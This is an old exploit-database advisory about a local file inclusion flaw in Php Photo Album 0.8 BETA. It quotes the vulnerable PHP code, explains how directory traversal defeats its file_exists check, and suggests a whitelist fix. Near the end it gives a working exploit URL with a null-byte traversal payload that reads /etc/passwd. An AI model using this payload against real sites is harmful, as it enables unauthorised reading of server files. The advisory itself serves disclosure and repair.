@@ -1,0 +1,52 @@
+[START]
+
+###################################################################################################################################
+[0x01] Informations:
+
+Script         : Php Photo Album 0.8 BETA
+Download       : http://sourceforge.net/project/downloading.php?group_id=151573&use_mirror=kent&filename=PHPPA_.9_BETA.zip&37834145
+Vulnerability  : Local File Inclusion
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+Notes          : Proud to be Italian
+
+
+###################################################################################################################################
+[0x02] Bug: [Local File Inclusion]
+######
+
+Bugged file is: /[path]/index.php
+
+[CODE]
+
+$skin_temp = $_GET['preview'];
+if(isset($_GET['preview']) && file_exists("./skin/$skin_temp/config.php")){
+	$skin = $_GET['preview'];
+	}
+else{
+	$skin = vari("skin");
+	}
+require("./skin/$skin/config.php");
+
+[/CODE]
+
+If 'preview' from GET is provided, we can include it just bypassing a stupid cheek.
+file_exists("./skin/$skin_temp/config.php) <-- this cheek is stupid, becouse when
+we set a value to $skin_temp , if we set a local file with a directory trasversal
+it's obvious that the file exists, so it will be included.
+
+[!] FIX: Use another filter instead of file_exists("./skin/$skin_temp/config.php)
+         Just filter $skin_temp before include it. A fix could be to declare $skin
+         with a standard or local value, or just put the allowed values in an array,
+         and cheek then if the skin provided is allowed. See is_in_array() function
+
+
+[!] EXPLOIT: /[path]/index.php?preview=[local_file]%00
+                                       ../../../../../../../../../../../../etc/passwd%00
+
+###################################################################################################################################
+
+[/END]
+
+# milw0rm.com [2009-01-14]
